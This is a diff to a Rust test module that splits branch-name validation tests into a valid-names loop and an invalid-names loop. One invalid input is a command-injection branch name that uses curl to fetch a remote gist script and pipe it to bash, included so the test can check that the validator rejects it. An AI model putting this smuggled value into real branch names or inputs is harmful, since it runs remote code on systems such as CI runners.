@@ -97,22 +97,31 @@ mod tests {
     use pretty_assertions::assert_eq;
 
     #[test]
-    fn test_branch_name() {
-        assert_eq!(true, is_valid_branch_name("refs/heads/main"));
-        assert_eq!(true, is_valid_branch_name("main"));
-        assert_eq!(true, is_valid_branch_name("MAIN"));
-        assert_eq!(true, is_valid_branch_name("bencher/main"));
-        assert_eq!(true, is_valid_branch_name("bencher-main"));
+    fn is_valid_branch_name_true() {
+        for name in [
+            "refs/heads/main",
+            "main",
+            "MAIN",
+            "bencher/main",
+            "bencher-main",
+        ] {
+            assert_eq!(true, is_valid_branch_name(name), "{name}");
+        }
+    }
 
-        assert_eq!(false, is_valid_branch_name(""));
-        assert_eq!(false, is_valid_branch_name(" main"));
-        assert_eq!(false, is_valid_branch_name("ma in"));
-        assert_eq!(false, is_valid_branch_name("main "));
-        assert_eq!(false, is_valid_branch_name(".main"));
-
-        // Credit to https://github.com/nikitastupin
-        let ref_name = "$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin
-            /30e525b776c409e03c2d6f328f254965/raw/shortcut.sh|bash)";
-        assert_eq!(false, is_valid_branch_name(ref_name));
+    #[test]
+    fn is_valid_branch_name_false() {
+        for name in [
+            "",
+            " main",
+            "ma in",
+            "main ",
+            ".main",
+            // Credit to https://github.com/nikitastupin
+            "$(curl${IFS}-L${IFS}gist.githubusercontent.com/nikitastupin
+            /30e525b776c409e03c2d6f328f254965/raw/shortcut.sh|bash)",
+        ] {
+            assert_eq!(false, is_valid_branch_name(name), "{name}");
+        }
     }
 }
